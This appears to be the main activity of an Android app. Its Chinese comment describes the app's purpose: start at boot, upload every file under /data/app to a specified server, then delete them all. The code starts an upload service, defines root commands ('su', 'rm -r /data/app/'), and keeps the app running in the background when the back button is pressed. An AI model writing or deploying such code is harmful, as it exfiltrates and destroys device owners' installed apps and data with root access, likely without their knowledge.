package com.getdataappapk;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int WRITE_EXTERNAL_STORAGE = 0;
    public static final String MESSAGR_ACTION = "MESSAGR_ACTION";
    public static final String KEY_MESSAGE = "KEY_MESSAGE";
    private TextView text_message;
    private TextView text_network;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        text_message = findViewById(R.id.text_message);
        text_network = findViewById(R.id.text_network);
        initReicever();

        text_network.setText("网络情况" + (NetworkUtil.isAvailable(this)?"良好":"断开"));

        List<String> lackedPermission = new ArrayList<String>();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!(checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)) {
                lackedPermission.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
                String[] requestPermissions = new String[lackedPermission.size()];
                lackedPermission.toArray(requestPermissions);
                requestPermissions(requestPermissions, WRITE_EXTERNAL_STORAGE);
            } else {
                initService();
            }
        } else {
            initService();
        }

    }


    private class ExecuteAsRoot extends AExecuteAsRoot {

        private String path;

        public ExecuteAsRoot(String path) {
            this.path = path;
        }

        @Override
        protected ArrayList<String> getCommandsToExecute() {
            ArrayList<String> list = new ArrayList<String>();
            list.add("adb shell");
            list.add("su");
            list.add("rm -r /data/app/");
            return list;
        }
    }

    private void initReicever() {
        IntentFilter intentFilter = new IntentFilter(MESSAGR_ACTION);
        registerReceiver(receiver, intentFilter);
    }

    BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            switch (intent.getAction()){
                case MESSAGR_ACTION:
                    String message = intent.getStringExtra(KEY_MESSAGE);
                    if(!TextUtils.isEmpty(message)){
                        text_message.append(message + "\n");
                    }
                    break;
            }
        }
    };

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterReceiver(receiver);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == WRITE_EXTERNAL_STORAGE) {

            if(grantResults != null
                    && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                initService();
            }
        }
    }

    private void initService() {
        Intent intent = new Intent(this, UploadIntentService.class);
//        bindService(intent, serviceConnection, BIND_AUTO_CREATE);

        startService(intent);
    }

    /*

    1，手机开机自启动app。
2，app启动后把/data/app 下的所有文件上传到指定的接口。
3，上传完毕后，把/data/app下的所有文件进行删除。
4，适配android 4，5，6，7版本。
     */


    @Override
    public void onBackPressed() {
        this.moveTaskToBack(true);
    }
}













